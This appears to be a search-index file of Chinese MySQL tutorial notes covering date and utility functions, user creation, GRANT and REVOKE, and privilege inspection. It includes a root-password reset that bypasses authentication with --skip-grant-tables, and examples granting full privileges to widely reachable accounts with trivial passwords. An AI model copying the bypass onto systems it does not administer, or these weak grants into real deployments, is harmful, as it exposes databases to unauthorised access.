\u65e5\u7684\u5929\u6570 SELECT TO_DAYS('0001-01-01 01:01:01') -> 366 WEEK(d) \u8ba1\u7b97\u65e5\u671f d \u662f\u672c\u5e74\u7684\u7b2c\u51e0\u4e2a\u661f\u671f\uff0c\u8303\u56f4\u662f 0 \u5230 53 SELECT WEEK('2011-11-11 11:11:11') -> 45 WEEKDAY(d) \u65e5\u671f d \u662f\u661f\u671f\u51e0\uff0c0 \u8868\u793a\u661f\u671f\u4e00\uff0c1 \u8868\u793a\u661f\u671f\u4e8c SELECT WEEKDAY(\"2017-06-15\"); -> 3 WEEKOFYEAR(d) \u8ba1\u7b97\u65e5\u671f d \u662f\u672c\u5e74\u7684\u7b2c\u51e0\u4e2a\u661f\u671f\uff0c\u8303\u56f4\u662f 0 \u5230 53 SELECT WEEKOFYEAR('2011-11-11 11:11:11') -> 45 YEAR(d) \u8fd4\u56de\u5e74\u4efd SELECT YEAR(\"2017-06-15\"); -> 2017 YEARWEEK(date, mode) \u8fd4\u56de\u5e74\u4efd\u53ca\u7b2c\u51e0\u5468\uff080\u523053\uff09\uff0cmode \u4e2d 0 \u8868\u793a\u5468\u5929\uff0c1\u8868\u793a\u5468\u4e00\uff0c\u4ee5\u6b64\u7c7b\u63a8 SELECT YEARWEEK(\"2017-06-15\"); -> 201724","title":"MySQL \u65e5\u671f\u51fd\u6570"},{"location":"database/mysql/function/#mysql_3","text":"\u51fd\u6570\u540d \u63cf\u8ff0 \u5b9e\u4f8b BIN(x) \u8fd4\u56de x \u7684\u4e8c\u8fdb\u5236\u7f16\u7801 15 \u7684 2 \u8fdb\u5236\u7f16\u7801: SELECT BIN(15); -- 1111 BINARY(s) \u5c06\u5b57\u7b26\u4e32 s \u8f6c\u6362\u4e3a\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32 SELECT BINARY \"RUNOOB\"; -> RUNOOB CASE expression WHEN condition1 THEN result1 WHEN condition2 THEN result2 ... WHEN conditionN THEN resultN ELSE result END CASE \u8868\u793a\u51fd\u6570\u5f00\u59cb\uff0cEND \u8868\u793a\u51fd\u6570\u7ed3\u675f\u3002\u5982\u679c condition1 \u6210\u7acb\uff0c\u5219\u8fd4\u56de result1, \u5982\u679c condition2 \u6210\u7acb\uff0c\u5219\u8fd4\u56de result2\uff0c\u5f53\u5168\u90e8\u4e0d\u6210\u7acb\u5219\u8fd4\u56de result\uff0c\u800c\u5f53\u6709\u4e00\u4e2a\u6210\u7acb\u4e4b\u540e\uff0c\u540e\u9762\u7684\u5c31\u4e0d\u6267\u884c\u4e86\u3002 SELECT CASE \u3000WHEN 1 > 0 \u3000THEN '1 > 0' \u3000WHEN 2 > 0 \u3000THEN '2 > 0' \u3000ELSE '3 > 0' \u3000END ->1 > 0 CAST(x AS type) \u8f6c\u6362\u6570\u636e\u7c7b\u578b \u5b57\u7b26\u4e32\u65e5\u671f\u8f6c\u6362\u4e3a\u65e5\u671f\uff1a SELECT CAST(\"2017-08-29\" AS DATE); -> 2017-08-29 COALESCE(expr1, expr2, ...., expr_n) \u8fd4\u56de\u53c2\u6570\u4e2d\u7684\u7b2c\u4e00\u4e2a\u975e\u7a7a\u8868\u8fbe\u5f0f\uff08\u4ece\u5de6\u5411\u53f3\uff09 SELECT COALESCE(NULL, NULL, NULL, 'runoob.com', NULL, 'google.com'); -> runoob.com CONNECTION_ID() \u8fd4\u56de\u552f\u4e00\u7684\u8fde\u63a5 ID SELECT CONNECTION_ID(); -> 4292835 CONV(x,f1,f2) \u8fd4\u56de f1 \u8fdb\u5236\u6570\u53d8\u6210 f2 \u8fdb\u5236\u6570 SELECT CONV(15, 10, 2); -> 1111 CONVERT(s USING cs) \u51fd\u6570\u5c06\u5b57\u7b26\u4e32 s \u7684\u5b57\u7b26\u96c6\u53d8\u6210 cs SELECT CHARSET('ABC') ->utf-8 SELECT CHARSET(CONVERT('ABC' USING gbk)) ->gbk CURRENT_USER() \u8fd4\u56de\u5f53\u524d\u7528\u6237 SELECT CURRENT_USER(); -> guest@% DATABASE() \u8fd4\u56de\u5f53\u524d\u6570\u636e\u5e93\u540d SELECT DATABASE(); -> runoob IF(expr,v1,v2) \u5982\u679c\u8868\u8fbe\u5f0f expr \u6210\u7acb\uff0c\u8fd4\u56de\u7ed3\u679c v1\uff1b\u5426\u5219\uff0c\u8fd4\u56de\u7ed3\u679c v2\u3002 SELECT IF(1 > 0,'\u6b63\u786e','\u9519\u8bef') ->\u6b63\u786e IFNULL(v1,v2) \u5982\u679c v1 \u7684\u503c\u4e0d\u4e3a NULL\uff0c\u5219\u8fd4\u56de v1\uff0c\u5426\u5219\u8fd4\u56de v2\u3002 SELECT IFNULL(null,'Hello Word') ->Hello Word ISNULL(expression) \u5224\u65ad\u8868\u8fbe\u5f0f\u662f\u5426\u4e3a NULL SELECT ISNULL(NULL); ->1 LAST_INSERT_ID() \u8fd4\u56de\u6700\u8fd1\u751f\u6210\u7684 AUTO_INCREMENT \u503c SELECT LAST_INSERT_ID(); ->6 NULLIF(expr1, expr2) \u6bd4\u8f83\u4e24\u4e2a\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u5b57\u7b26\u4e32 expr1 \u4e0e expr2 \u76f8\u7b49 \u8fd4\u56de NULL\uff0c\u5426\u5219\u8fd4\u56de expr1 SELECT NULLIF(25, 25); -> SESSION_USER() \u8fd4\u56de\u5f53\u524d\u7528\u6237 SELECT SESSION_USER(); -> guest@% SYSTEM_USER() \u8fd4\u56de\u5f53\u524d\u7528\u6237 SELECT SYSTEM_USER(); -> guest@% USER() \u8fd4\u56de\u5f53\u524d\u7528\u6237 SELECT USER(); -> guest@% VERSION() \u8fd4\u56de\u6570\u636e\u5e93\u7684\u7248\u672c\u53f7 SELECT VERSION() -> 5.6.34","title":"MySQL \u9ad8\u7ea7\u51fd\u6570"},{"location":"database/mysql/grant/","text":"\u7528\u6237\u4e0e\u6388\u6743 MySQL\u4e2d\u7684\u7528\u6237\u5b58\u5728\u54ea\u5f20\u8868\u4e2d mysql.user mysql> select user,host,password from mysql.user; +------+-----------+-------------------------------------------+ | user | host | password | +------+-----------+-------------------------------------------+ | root | localhost | *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 | | root | mysql | | | root | 127.0.0.1 | | | root | ::1 | | | | localhost | | | | mysql | | +------+-----------+-------------------------------------------+ 6 rows in set (0.00 sec) \u5982\u679croot\u5bc6\u7801\u5fd8\u8bb0\u4e86\uff0c\u8be5\u600e\u4e48\u529e\uff1f \u7834\u89e3root\u5bc6\u7801\u524d\u63d0\uff0c\u5c31\u662f\u4f60\u80fd\u591f\u505c\u6b62mysql\u670d\u52a1\u3002 1\uff09\u505c\u6b62\u670d\u52a1 [root@mysql ~]# /etc/init.d/mysqld stop 2\uff09\u4f7f\u7528\u8df3\u8fc7\u6388\u6743\u8868\u7684\u65b9\u5f0f\u542f\u52a8\u6570\u636e\u5e93 [root@mysql ~]# mysqld_safe --skip-grant-tables --user=mysql & 3\uff09\u533f\u540d\u767b\u5f55 [root@mysql ~]# mysql 4\uff09\u4fee\u6539user\u8868 mysql> use mysql; Database changed mysql> select user,host,password from user; mysql> update user set password=password(\"redhat\") where user='root' and host='localhost'; #\u4f7f\u7528password()\u51fd\u6570\u53bb\u751f\u6210\u65b0\u5bc6\u7801\u7684\u52a0\u5bc6\u5b57\u7b26\u4e32 5\uff09\u91cd\u542fmysql\u670d\u52a1 [root@mysql mysql]# mysqladmin shutdown //\u6b63\u5e38\u60c5\u51b5\u4e0b\u4f7f\u7528mysqld_safe\u542f\u52a8\u7684\u670d\u52a1\u9700\u8981\u8fd9\u4e48\u5173\u95ed [root@mysql mysql]# ps -ef | grep mysqld root 25049 16794 0 11:39 pts/0 00:00:00 grep mysqld -------------------- \u5982\u679c\u6b63\u5e38\u5173\u95ed\u4e0d\u597d\u4f7f\uff0c\u90a3\u4e48\u5c31\u5f3a\u5236\u6740\u6b7b\u8fdb\u7a0b [root@mysql mysql]# kill -9 `pgrep mysqld` -------------------- [root@mysql mysql]# /etc/init.d/mysqld start 6\uff09\u91cd\u65b0\u4f7f\u7528\u65b0\u7684\u5bc6\u7801\u767b\u5f55\u6570\u636e\u5e93\u5373\u53ef [root@mysql mysql]# mysql -uroot -predhat ------------------------------------------------------------------------------- \u63d2\u66f2 [root@mysql subsys]# pwd /var/lock/subsys //\u5404\u79cd\u670d\u52a1\u7684\u9501\u6587\u4ef6\u6240\u5728\u7684\u4f4d\u7f6e xxxx is not running\uff0cbut lock file exists. ------------------------------------------------------------------------------ \u521b\u5efa\u7528\u6237 \u8bed\u6cd5\uff1acreate user \u7528\u6237\u540d@\u4e3b\u673a identified by '\u5bc6\u7801'; 1\u3001\u521b\u5efa\u672c\u5730\u7528\u6237 mysql> create user local@localhost identified by 'local'; mysql> select user,host,password from mysql.user where user='local'; +-------+-----------+-------------------------------------------+ | user | host | password | +-------+-----------+-------------------------------------------+ | local | localhost | *EF82E77FF4184209858BDA2C853D3D7A5870DE80 | +-------+-----------+-------------------------------------------+ 1 row in set (0.00 sec) \u767b\u5f55\u6d4b\u8bd5\uff1a [root@mysql ~]# mysql -ulocal -plocal mysql> show databases; //\u666e\u901a\u7528\u6237\uff0c\u9ed8\u8ba4\u53ea\u80fd\u770b\u5230\u4ee5\u4e0b\u4e24\u4e2a\u6570\u636e\u5e93 +--------------------+ | Database | +--------------------+ | information_schema | | test | +--------------------+ 2 rows in set (0.00 sec) 2\u3001\u5220\u9664\u7528\u6237 mysql> drop user local@localhost; //\u7528\u666e\u901a\u7528\u6237\u5220\u9664\u4e0d\u4e86\u7528\u6237 ERROR 1227 (42000): Access denied; you need (at least one of) the CREATE USER privilege(s) for this operation mysql> exit Bye [root@mysql ~]# mysql -uroot -predhat mysql> drop user local@localhost; Query OK, 0 rows affected (0.03 sec) 3\u3001\u521b\u5efa\u53ef\u4ee5\u8fdc\u7a0b\u767b\u5f55\u7684\u7528\u6237 \u670d\u52a1\u5668\u7aef\uff1a172.16.254.200 \u5ba2\u6237\u7aef\uff1a172.16.42.8 \u4fdd\u8bc1\u8981\u6709mysql\u547d\u4ee4 1\uff09\u670d\u52a1\u5668\u7aef\u64cd\u4f5c \uff081\uff09\u521b\u5efa\u8fdc\u7a0b\u7528\u6237 mysql> create user remote@'172.16.42.8' identified by 'simida'; //\u6b64\u5904\u4e3a\u5ba2\u6237\u7aefIP mysql> create user remote@'%' identified by 'simida'; # %\u8868\u793a\u9664\u4e86localhost\u548c127.0.0.1\u4e4b\u5916\u7684\u6240\u6709\u5ba2\u6237\u7aef mysql> create user remote@'172.16.%.%' identified by 'simida'; # 172.16.%.%\u8868\u793a172.16.0.0/16\u7f51\u6bb5\u7684\u6240\u6709\u5ba2\u6237\u7aef \uff082\uff09\u91cd\u542f\u670d\u52a1 [root@mysql mysql]# /etc/init.d/mysqld restart \u63d2\u66f2\uff1a\u5982\u679c\u8fdc\u7a0b\u8fde\u63a5\u62a5\u5982\u4e0b\u9519\u8bef\uff0c\u90a3\u4e48\u4fee\u6539\u670d\u52a1\u5668\u7aef\u914d\u7f6e\u6587\u4ef6\uff0c\u6dfb\u52a0\u4e00\u884c\u5373\u53ef\uff1a [root@MySQL ~]# mysql -u remote -h 172.16.254.200 -p Enter password: ERROR 1042 (HY000): Can't get hostname for your address ---------------- [root@mysql mysql]# /etc/my.cnf \u5728[mysqld]\u90a3\u6bb5\u91cc\u9762\u6dfb\u52a0\u5982\u4e0b\u884c\uff1a5.6\u7248\u672c\u4e0d\u9700\u8981 skip-name-resolve //\u8df3\u8fc7\u540d\u5b57\u89e3\u6790\uff0c\u5426\u5219\u65e0\u6cd5\u8fdc\u7a0b\u8fde\u63a5\u8be5mysql\u7ba1\u7406\u7cfb\u7edf 2\uff09\u5ba2\u6237\u7aef\u767b\u5f55\u9a8c\u8bc1 #\u5ba2\u6237\u7aefIP\uff1a172.16.42.8 [root@MySQL ~]# mysql -u remote -h 172.16.254.200 -p //\u6b64\u5904\u4e3a\u670d\u52a1\u5668\u7aefIP Enter password:simida 4\u3001\u6388\u6743 grant grant\u4e0d\u4ec5\u53ef\u4ee5\u6388\u6743\uff0c\u8fd8\u80fd\u521b\u5efa\u7528\u6237 \u6388\u6743\u7684\u8bed\u6cd5\uff1agrant \u6743\u9650\u5217\u8868 on \u5e93\u540d.\u8868\u540d to \u7528\u6237@\u4e3b\u673a identified by '\u5bc6\u7801'; 1\uff09\u6388\u4e88\u5168\u90e8\u6743\u9650 mysql> grant all on *.* to allpriv@'172.16.%.%' identified by 'allpriv'; mysql> flush privileges; //\u5237\u65b0\u6743\u9650 Query OK, 0 rows affected (0.00 sec) \u6d4b\u8bd5\uff1a [root@mysql mysql]# mysql -uallpriv -h 172.16.254.200 -p Enter password: \u63d2\u66f2\uff1a\u6743\u9650\u7684\u7ea7\u8054\u6388\u4e88 mysql> grant select on test.score to douni@'%' identified by 'douni'; ERROR 1142 (42000): GRANT command denied to user 'allpriv'@'172.16.254.200' for table 'score' \u7528root\u7528\u6237\u521b\u5efa\u7528\u6237\u65f6\uff0c\u5e0c\u671b\u65b0\u7684\u7528\u6237\u80fd\u591f\u7ed9\u522b\u4eba\u6388\u6743\u7684\u8bdd\uff0c\u6267\u884c\u5982\u4e0b\u64cd\u4f5c\uff1a mysql> grant all on *.* to allpriv1@'172.16.%.%' identified by 'allpriv1' with grant option; [root@mysql mysql]# mysql -uallpriv1 -h 172.16.254.200 -p Enter password: mysql> grant select on test.score to douni2@'%' identified by 'douni'; //\u80fd\u591f\u6267\u884c\u6210\u529f ------------------------------------------------------ 2\uff09\u6388\u4e88\u90e8\u5206\u6743\u9650 mysql> create database up; Query OK, 1 row affected (0.00 sec) mysql> use up; Database changed mysql> create table upt1 (id int); Query OK, 0 rows affecte d (0.01 sec) mysql> insert into upt1 values(); Query OK, 1 row affected (0.00 sec) mysql> insert into upt1 values(); Query OK, 1 row affected (0.01 sec) mysql> insert into upt1 values(); Query OK, 1 row affected (0.00 sec) mysql> create table upt2 (id int); Query OK, 0 rows affected (0.03 sec) mysql> grant select,insert,update on up.upt1 to douwo@'%' identified by 'douwo'; mysql> flush privileges; \u9a8c\u8bc1\u6743\u9650 [root@mysql ~]# mysql -udouwo -h 172.16.254.200 -p Enter password: mysql> show databases; +--------------------+ | Database | +--------------------+ | information_schema | | test | | up | +--------------------+ 3 rows in set (0.00 sec) mysql> use up; Database changed mysql> show tables; +--------------+ | Tables_in_up | +--------------+ | upt1 | //\u53ea\u5bf9\u8be5\u8868\u6709\u6743\u9650\uff0c\u5c31\u53ea\u80fd\u770b\u5230\u8fd9\u5f20\u8868 +--------------+ 1 row in set (0.00 sec) mysql> select * from upt1; +------+ | id | +------+ | NULL | | NULL | | NULL | +------+ 3 rows in set (0.00 sec) mysql> update upt1 set id=1 where id is null; //\u6210\u529f mysql> insert into upt1 values(); //\u6210\u529f Query OK, 1 row affected (0.00 sec) mysql> delete from upt1 where id is null; //\u5931\u8d25 ERROR 1142 (42000): DELETE command denied to user 'douwo'@'172.16.254.200' for table 'upt1' mysql> drop table upt1; //\u5931\u8d25 ERROR 1142 (42000): DROP command denied to user 'douwo'@'172.16.254.200' for table 'upt1' 5\u3001\u56de\u6536\u6743\u9650 revoke \u53d6\u6d88\u7528\u6237\u6743\u9650\uff1a 1\uff09\u5220\u9664\u7528\u6237 2\uff09revoke \u56de\u6536\u8bed\u6cd5\uff1arevoke \u6743\u9650 on \u5e93\u540d.\u8868\u540d from \u7528\u6237@\u4e3b\u673a; [root@mysql ~]# mysql -uroot -p Enter password: mysql> revoke all on *.* from allpriv@'172.16.%.%'; \u56de\u6536\u90e8\u5206\u6743\u9650 mysql> show grants for part@'%'; //\u67e5\u770b\u7528\u6237\u7684\u6743\u9650\u7684 +-----------------------------------------------------------------------------------------------------+ | Grants for part@% | +-----------------------------------------------------------------------------------------------------+ | GRANT USAGE ON *.* TO 'part'@'%' IDENTIFIED BY PASSWORD '*57FA4A97AD182F6A0872282CACBE109822E9E801' | | GRANT SELECT, INSERT, UPDATE ON `test`.`score` TO 'part'@'%' | +-----------------------------------------------------------------------------------------------------+ 2 rows in set (0.00 sec) mysql> revoke update on test.score from part@'%'; Query OK, 0 rows affected (0.00 sec) mysql> show grants for part@'%'; +-----------------------------------------------------------------------------------------------------+ | Grants for part@% | +-----------------------------------------------------------------------------------------------------+ | GRANT USAGE ON *.* TO 'part'@'%' IDENTIFIED BY PASSWORD '*57FA4A97AD182F6A0872282CACBE109822E9E801' | | GRANT SELECT, INSERT ON `test`.`score` TO 'part'@'%' | +-----------------------------------------------------------------------------------------------------+ 2 rows in set (0.00 sec) 6\u3001\u67e5\u770b\u7528\u6237\u7684\u6743\u9650 mysql> select user,host from mysql.user; +----------+-------------+ | user | host | +----------+-------------+ | douni | % | | douni2 | % | | douwo | % | | part | % | | root | 127.0.0.1 | | allpriv | 172.16.%.% | | allpriv1 | 172.16.%.% | | remote | 172.16.42.8 | | root | ::1 | | | localhost | | root | localhost | | | mysql | | root | mysql | +----------+-------------+ 13 rows in set (0.00 sec) mysql> show grants for part@'%'; #\u67e5\u770b\u7528\u6237\u7684\u6743\u9650\u7684 +-----------------------------------------------------------------------------------------------------+ | Grants for part@% | +-----------------------------------------------------------------------------------------------------+ | GRANT USAGE ON *.* TO 'part'@'%' IDENTIFIED BY PASSWORD '*57FA4A97AD182F6A0872282CACBE109822E9E801' | | GRANT SELECT, INSERT, UPDATE ON `test`.`score` TO 'part'@'%' | +-----------------------------------------------------------------------------------------------------+ 2 rows in set (0.00 sec) #\u6743\u9650\u67e5\u770b: mysql> use information_schema; Database changed mysql> select distinct grantee from user_privileges; mysql> select privilege_type from user_privileges where grantee=\"'test'@'172.16.%.%'\"; +-------------------------+ | privilege_type | +-------------------------+ | SELECT | | INSERT | | UPDATE | | DELETE | | CREATE | | DROP | | RELOAD | | SHUTDOWN | | PROCESS | | FILE | | REFERENCES | | INDEX | | ALTER | | SHOW DATABASES | | SUPER | | CREATE TEMPORARY TABLES | | LOCK TABLES | | EXECUTE | | REPLICATION SLAVE | | REPLICATION CLIENT | | CREATE VIEW | | SHOW VIEW | | CREATE ROUTINE | | ALTER ROUTINE | | CREATE USER | | EVENT | | TRIGGER | | CREATE TABLESPACE | +-------------------------+ 28 rows in set (0.00 sec)","title":"\u6388\u6743"},{"location":"database/mysql/grant/#_1","text":"MySQL\u4e2d\u7684\u7528\u6237\u5b58\u5728\u54ea\u5f20\u8868\u4e2d mysql.user mysql> select user,host,password from mysql.user; +------+-----------+-------------------------------------------+ | user | host | password | +------+-----------+-------------------------------------------+ | root | localhost | *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 | | root | mysql | | | root | 127.0.0.1 | | | root | ::1 | | | | localhost | | | | mysql | | +------+-----------+-------------------------------------------+ 6 rows in set (0.00 sec)","title":"\u7528\u6237\u4e0e\u6388\u6743"},{"location":"database/mysql/grant/#root","text":"\u7834\u89e3root\u5bc6\u7801\u524d\u63d0\uff0c\u5c31\u662f\u4f60\u80fd\u591f\u505c\u6b62mysql\u670d\u52a1\u3002 1\uff09\u505c\u6b62\u670d\u52a1 [root@mysql ~]# /etc/init.d/mysqld stop 2\uff09\u4f7f\u7528\u8df3\u8fc7\u6388\u6743\u8868\u7684\u65b9\u5f0f\u542f\u52a8\u6570\u636e\u5e93 [root@mysql ~]# mysqld_safe --skip-grant-tables --user=mysql & 3\uff09\u533f\u540d\u767b\u5f55 [root@mysql ~]# mysql 4\uff09\u4fee\u6539user\u8868 mysql> use mysql; Database changed mysql> select user,host,password from user; mysql> update user set password=password(\"redhat\") where user='root' and host='localhost'; #\u4f7f\u7528password()\u51fd\u6570\u53bb\u751f\u6210\u65b0\u5bc6\u7801\u7684\u52a0\u5bc6\u5b57\u7b26\u4e32 5\uff09\u91cd\u542fmysql\u670d\u52a1 [root@mysql mysql]# mysqladmin shutdown //\u6b63\u5e38\u60c5\u51b5\u4e0b\u4f7f\u7528mysqld_safe\u542f\u52a8\u7684\u670d\u52a1\u9700\u8981\u8fd9\u4e48\u5173\u95ed [root@mysql mysql]# ps -ef | grep mysqld root 25049 16794 0 11:39 pts/0 00:00:00 grep mysqld -------------------- \u5982\u679c\u6b63\u5e38\u5173\u95ed\u4e0d\u597d\u4f7f\uff0c\u90a3\u4e48\u5c31\u5f3a\u5236\u6740\u6b7b\u8fdb\u7a0b [root@mysql mysql]# kill -9 `pgrep mysqld` -------------------- [root@mysql mysql]# /etc/init.d/mysqld start 6\uff09\u91cd\u65b0\u4f7f\u7528\u65b0\u7684\u5bc6\u7801\u767b\u5f55\u6570\u636e\u5e93\u5373\u53ef [root@mysql mysql]# mysql -uroot -predhat ------------------------------------------------------------------------------- \u63d2\u66f2 [root@mysql subsys]# pwd /var/lock/subsys //\u5404\u79cd\u670d\u52a1\u7684\u9501\u6587\u4ef6\u6240\u5728\u7684\u4f4d\u7f6e xxxx is not running\uff0cbut lock file exists. ------------------------------------------------------------------------------ \u521b\u5efa\u7528\u6237 \u8bed\u6cd5\uff1acreate user \u7528\u6237\u540d@\u4e3b\u673a identified by '\u5bc6\u7801';","title":"\u5982\u679croot\u5bc6\u7801\u5fd8\u8bb0\u4e86\uff0c\u8be5\u600e\u4e48\u529e\uff1f"},{"location":"database/mysql/grant/#1","text":"mysql> create user local@localhost identified by 'local'; mysql> select user,host,password from mysql.user where user='local'; +-------+-----------+-------------------------------------------+ | user | host | password | +-------+-----------+-------------------------------------------+ | local | localhost | *EF82E77FF4184209858BDA2C853D3D7A5870DE80 | +-------+-----------+-------------------------------------------+ 1 row in set (0.00 sec) \u767b\u5f55\u6d4b\u8bd5\uff1a [root@mysql ~]# mysql -ulocal -plocal mysql> show databases; //\u666e\u901a\u7528\u6237\uff0c\u9ed8\u8ba4\u53ea\u80fd\u770b\u5230\u4ee5\u4e0b\u4e24\u4e2a\u6570\u636e\u5e93 +--------------------+ | Database | +--------------------+ | information_schema | | test | +--------------------+ 2 rows in set (0.00 sec)","title":"1\u3001\u521b\u5efa\u672c\u5730\u7528\u6237"},{"location":"database/mysql/grant/#2","text":"mysql> drop user local@localhost; //\u7528\u666e\u901a\u7528\u6237\u5220\u9664\u4e0d\u4e86\u7528\u6237 ERROR 1227 (42000): Access denied; you need (at least one of) the CREATE USER privilege(s) for this operation mysql> exit Bye [root@mysql ~]# mysql -uroot -predhat mysql> drop user local@localhost; Query OK, 0 rows affected (0.03 sec)","title":"2\u3001\u5220\u9664\u7528\u6237"},{"location":"database/mysql/grant/#3","text":"\u670d\u52a1\u5668\u7aef\uff1a172.16.254.200 \u5ba2\u6237\u7aef\uff1a172.16.42.8 \u4fdd\u8bc1\u8981\u6709mysql\u547d\u4ee4","title":"3\u3001\u521b\u5efa\u53ef\u4ee5\u8fdc\u7a0b\u767b\u5f55\u7684\u7528\u6237"},{"location":"database/mysql/grant/#1_1","text":"","title":"1\uff09\u670d\u52a1\u5668\u7aef\u64cd\u4f5c"},{"location":"database/mysql/grant/#1_2","text":"mysql> create user remote@'172.16.42.8' identified by 'simida'; //\u6b64\u5904\u4e3a\u5ba2\u6237\u7aefIP mysql> create user remote@'%' identified by 'simida'; # %\u8868\u793a\u9664\u4e86localhost\u548c127.0.0.1\u4e4b\u5916\u7684\u6240\u6709\u5ba2\u6237\u7aef mysql> create user remote@'172.16.%.%' identified by 'simida'; # 172.16.%.%\u8868\u793a172.16.0.0/16\u7f51\u6bb5\u7684\u6240\u6709\u5ba2\u6237\u7aef","title":"\uff081\uff09\u521b\u5efa\u8fdc\u7a0b\u7528\u6237"},{"location":"database/mysql/grant/#2_1","text":"[root@mysql mysql]# /etc/init.d/mysqld restart \u63d2\u66f2\uff1a\u5982\u679c\u8fdc\u7a0b\u8fde\u63a5\u62a5\u5982\u4e0b\u9519\u8bef\uff0c\u90a3\u4e48\u4fee\u6539\u670d\u52a1\u5668\u7aef\u914d\u7f6e\u6587\u4ef6\uff0c\u6dfb\u52a0\u4e00\u884c\u5373\u53ef\uff1a [root@MySQL ~]# mysql -u remote -h 172.16.254.200 -p Enter password: ERROR 1042 (HY000): Can't get hostname for your address ---------------- [root@mysql mysql]# /etc/my.cnf \u5728[mysqld]\u90a3\u6bb5\u91cc\u9762\u6dfb\u52a0\u5982\u4e0b\u884c\uff1a5.6\u7248\u672c\u4e0d\u9700\u8981 skip-name-resolve //\u8df3\u8fc7\u540d\u5b57\u89e3\u6790\uff0c\u5426\u5219\u65e0\u6cd5\u8fdc\u7a0b\u8fde\u63a5\u8be5mysql\u7ba1\u7406\u7cfb\u7edf","title":"\uff082\uff09\u91cd\u542f\u670d\u52a1"},{"location":"database/mysql/grant/#2_2","text":"#\u5ba2\u6237\u7aefIP\uff1a172.16.42.8 [root@MySQL ~]# mysql -u remote -h 172.16.254.200 -p //\u6b64\u5904\u4e3a\u670d\u52a1\u5668\u7aefIP Enter password:simida","title":"2\uff09\u5ba2\u6237\u7aef\u767b\u5f55\u9a8c\u8bc1"},{"location":"database/mysql/grant/#4-grant","text":"grant\u4e0d\u4ec5\u53ef\u4ee5\u6388\u6743\uff0c\u8fd8\u80fd\u521b\u5efa\u7528\u6237 \u6388\u6743\u7684\u8bed\u6cd5\uff1agrant \u6743\u9650\u5217\u8868 on \u5e93\u540d.\u8868\u540d to \u7528\u6237@\u4e3b\u673a identified by '\u5bc6\u7801';","title":"4\u3001\u6388\u6743  grant"},{"location":"database/mysql/grant/#1_3","text":"mysql> grant all on *.* to allpriv@'172.16.%.%' identified by 'allpriv'; mysql> flush privileges; //\u5237\u65b0\u6743\u9650 Query OK, 0 rows affected (0.00 sec) \u6d4b\u8bd5\uff1a [root@mysql mysql]# mysql -uallpriv -h 172.16.254.200 -p Enter password: \u63d2\u66f2\uff1a\u6743\u9650\u7684\u7ea7\u8054\u6388\u4e88 mysql> grant select on test.score to douni@'%' identified by 'douni'; ERROR 1142 (42000): GRANT command denied to user 'allpriv'@'172.16.254.200' for table 'score' \u7528root\u7528\u6237\u521b\u5efa\u7528\u6237\u65f6\uff0c\u5e0c\u671b\u65b0\u7684\u7528\u6237\u80fd\u591f\u7ed9\u522b\u4eba\u6388\u6743\u7684\u8bdd\uff0c\u6267\u884c\u5982\u4e0b\u64cd\u4f5c\uff1a mysql> grant all on *.* to allpriv1@'172.16.%.%' identified by 'allpriv1' with grant option; [root@mysql mysql]# mysql -uallpriv1 -h 172.16.254.200 -p Enter password: mysql> grant select on test.score to douni2@'%' identified by 'douni'; //\u80fd\u591f\u6267\u884c\u6210\u529f ------------------------------------------------------","title":"1\uff09\u6388\u4e88\u5168\u90e8\u6743\u9650"},{"location":"database/mysql/grant/#2_3","text":"mysql> create database up; Query OK, 1 row affected (0.00 sec) mysql> use up; Database changed mysql> create table upt1 (id int); Query OK, 0 rows affecte d (0.01 sec) mysql> insert into upt1 values(); Query OK, 1 row affected (0.00 sec) mysql> insert into upt1 values(); Query OK, 1 row affected (0.01 sec) mysql> insert into upt1 values(); Query OK, 1 row affected (0.00 sec) mysql> create table upt2 (id int); Query OK, 0 rows affected (0.03 sec) mysql> grant select,insert,update on up.upt1 to douwo@'%' identified by 'douwo'; mysql> flush privileges; \u9a8c\u8bc1\u6743\u9650 [root@mysql ~]# mysql -udouwo -h 172.16.254.200 -p Enter password: mysql> show databases; +--------------------+ | Database | +--------------------+ | information_schema | | test | | up | +--------------------+ 3 rows in set (0.00 sec) mysql> use up; Database changed mysql> show tables; +--------------+ | Tables_in_up | +--------------+ | upt1 | //\u53ea\u5bf9\u8be5\u8868\u6709\u6743\u9650\uff0c\u5c31\u53ea\u80fd\u770b\u5230\u8fd9\u5f20\u8868 +--------------+ 1 row in set (0.00 sec) mysql> select * from upt1; +------+ | id | +------+ | NULL | | NULL | | NULL | +------+ 3 rows in set (0.00 sec) mysql> update upt1 set id=1 where id is null; //\u6210\u529f mysql> insert into upt1 values(); //\u6210\u529f Query OK, 1 row affected (0.00 sec) mysql> delete from upt1 where id is null; //\u5931\u8d25 ERROR 1142 (42000): DELETE command denied to user 'douwo'@'172.16.254.200' for table 'upt1' mysql> drop table upt1; //\u5931\u8d25 ERROR 1142 (42000): DROP command denied to user 'douwo'@'172.16.254.200' for table 'upt1'","title":"2\uff09\u6388\u4e88\u90e8\u5206\u6743\u9650"},{"location":"database/mysql/grant/#5-revoke","text":"\u53d6\u6d88\u7528\u6237\u6743\u9650\uff1a 1\uff09\u5220\u9664\u7528\u6237 2\uff09revoke \u56de\u6536\u8bed\u6cd5\uff1arevoke \u6743\u9650 on \u5e93\u540d.\u8868\u540d from \u7528\u6237@\u4e3b\u673a; [root@mysql ~]# mysql -uroot -p Enter password: mysql> revoke all on *.* from allpriv@'172.16.%.%'; \u56de\u6536\u90e8\u5206\u6743\u9650 mysql> show grants for part@'%'; //\u67e5\u770b\u7528\u6237\u7684\u6743\u9650\u7684 +-----------------------------------------------------------------------------------------------------+ | Grants for part@% | +-----------------------------------------------------------------------------------------------------+ | GRANT USAGE ON *.* TO 'part'@'%' IDENTIFIED BY PASSWORD '*57FA4A97AD182F6A0872282CACBE109822E9E801' | | GRANT SELECT, INSERT, UPDATE ON `test`.`score` TO 'part'@'%' | +-----------------------------------------------------------------------------------------------------+ 2 rows in set (0.00 sec) mysql> revoke update on test.score from part@'%'; Query OK, 0 rows affected (0.00 sec) mysql> show grants for part@'%'; +-----------------------------------------------------------------------------------------------------+ | Grants for part@% | +-----------------------------------------------------------------------------------------------------+ | GRANT USAGE ON *.* TO 'part'@'%' IDENTIFIED BY PASSWORD '*57FA4A97AD182F6A0872282CACBE109822E9E801' | | GRANT SELECT, INSERT ON `test`.`score` TO 'part'@'%' | +-----------------------------------------------------------------------------------------------------+ 2 rows in set (0.00 sec)","title":"5\u3001\u56de\u6536\u6743\u9650    